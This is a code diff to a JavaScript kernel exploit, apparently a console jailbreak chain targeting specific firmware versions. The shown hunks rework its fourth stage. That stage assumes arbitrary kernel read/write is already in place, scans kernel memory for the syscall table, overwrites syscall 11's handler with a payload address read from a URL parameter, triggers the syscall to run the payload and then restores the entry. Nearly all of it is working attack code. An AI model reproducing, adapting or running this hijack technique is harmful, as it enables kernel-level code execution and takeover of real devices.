@@ -23,7 +23,7 @@ const OPS_OFF = 0x985a;
 const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
 const ROUNDS = 6;
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, kread: null, kwrite: null, payloadAddr: 0n };
+const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, payloadAddr: 0n };
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
@@ -247,37 +247,46 @@ export async function runKevent(c) {
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
 
-  // --- STAGE 4: SCAN AND HIJACK ---
-  // The payload is provided by the caller at a known address.
-  const payloadAddr = BigInt(c.params.get("payload") || "0x2002bc000");
+  // --- STAGE 4: HIJACK AND JUMP ---
+  
+  // Read payload address from URL or use default 0x2002bc000
+  const payloadParam = c.params.get("payload");
+  let payloadAddr;
+  if (payloadParam) {
+    payloadAddr = BigInt(payloadParam);
+  } else {
+    // Default 14.00 payload address
+    payloadAddr = 0x2002bc000n;
+  }
   STATE.payloadAddr = payloadAddr;
-  log("STAGE4-PAYLOAD", "payload addr=" + h16(payloadAddr));
+  log("STAGE4-PAYLOAD", "target address=" + h16(payloadAddr));
 
-  // Try known offsets around 13.52's sysent[11].sy_call (P[0] = 0x10EBE88)
+  // Scan for sysent table around 13.52 offset
+  // On 13.52, sysent[11].sy_call is at P[0] = 0x10EBE88
   const P0_1352 = 0x10EBE88n;
-  const scanRange = 0x100000n; // +/- 1MB
+  const scanRange = 0x400000n; // +/- 4MB to be safe
   log("STAGE4-SCAN", "scanning sysent around 0x" + P0_1352.toString(16) + " +/- 0x" + scanRange.toString(16));
 
   let sysent11CallAddr = null;
-  let sysent11Base = null;
+  let candidates = [];
+  
   for (let offset = -scanRange; offset <= scanRange; offset += 0x1000n) {
     const testAddr = STATE.kbase + P0_1352 + offset;
     try {
-      // sysent[11].sy_call at offset 8 in the sysent struct (size 0x30)
-      // Each sysent struct is 0x30 bytes: sy_narg(4) + pad(4) + sy_call(8) + ...
-      // So sysent[11] = sysent_base + 11*0x30 = +0x210
-      // sy_call at +8, so test_addr points to sy_call of sysent[11] candidate.
+      // sysent[11].sy_call is at sysent_base + 11*0x30 + 8 = +0x210
+      // But we don't know the exact base. Assume the test address is a candidate.
       const val = p.read8(toI64(testAddr));
-      if (val.hi >>> 0 === 0xffffffff && val.low >>> 0 > 0x100000) {
-        // Verify by checking sysent[11].sy_narg at test_addr - 8
+      if (val.hi >>> 0 === 0xffffffff && val.low >>> 0 > 0x100000 && val.low >>> 0 < 0xffffffff) {
+        // Verify by checking sy_narg at -8 (previous 4 bytes are sy_narg)
         const narg = p.read4(toI64(testAddr - 8n));
         if (narg >= 0 && narg <= 8) {
           log("STAGE4-CANDIDATE", "offset=+0x" + offset.toString(16) +
-              " sysent[11].sy_call=" + h16(val) +
-              " sy_narg=" + narg);
+              " addr=" + h16(testAddr) +
+              " val=" + h16(val) +
+              " narg=" + narg);
+          candidates.push({ offset, addr: testAddr, val, narg });
           if (!sysent11CallAddr) {
             sysent11CallAddr = testAddr;
-            sysent11Base = testAddr - 0x210n;
           }
         }
       }
@@ -288,13 +297,13 @@ export async function runKevent(c) {
     fin("STAGE4-FAIL: no valid sysent[11].sy_call found in scan range");
   }
 
-  log("STAGE4-FOUND", "sysent[11].sy_call at " + h16(sysent11CallAddr) + " (base=" + h16(sysent11Base) + ")");
+  log("STAGE4-FOUND", "sysent[11].sy_call at " + h16(sysent11CallAddr) + " (candidates=" + candidates.length + ")");
 
   // Save original
   const orig11Call = p.read8(toI64(sysent11CallAddr));
   log("STAGE4-ORIG", "orig sy_call=" + orig11Call);
 
-  // Hijack sysent[11].sy_call to payload
+  // Hijack
   p.write8(toI64(sysent11CallAddr), toI64(payloadAddr));
   log("STAGE4-HIJACK", "wrote " + h16(payloadAddr) + " to sysent[11].sy_call");
 
@@ -307,30 +316,19 @@ export async function runKevent(c) {
   }
   log("STAGE4-VERIFIED", "sysent[11].sy_call now points at payload");
 
-  // Also try sysent[661] if you prefer a rarely-used syscall
-  // (comment out the block above and uncomment this if 11 causes issues)
-  /*
-  const sysent661Addr = sysent11Base + 661n * 0x30n + 8n;
-  const orig661Call = p.read8(toI64(sysent661Addr));
-  log("STAGE4-661-ORIG", "orig sy_call=" + orig661Call);
-  p.write8(toI64(sysent661Addr), toI64(payloadAddr));
-  log("STAGE4-661-HIJACK", "wrote " + h16(payloadAddr) + " to sysent[661].sy_call");
-  */
-
-  // --- TRIGGER ---
+  // TRIGGER - call syscall 11
   log("STAGE4-TRIGGER", "calling syscall(11)...");
   try {
-    // Try syscall 11 (hijacked above)
     const ret = scn(11);
     log("STAGE4-TRIGGER-RETURNED", "ret=" + ret);
   } catch (e) {
     log("STAGE4-TRIGGER-THREW", e.message);
   }
 
-  // Restore original
+  // Restore
   p.write8(toI64(sysent11CallAddr), orig11Call);
   log("STAGE4-RESTORE", "sysent[11].sy_call restored");
 
-  log("STAGE4-DONE", "payload execution attempted");
+  log("STAGE4-DONE", "payload execution attempted at " + h16(payloadAddr));
   fin("Stage 4 Complete. Payload should be running.");
 }
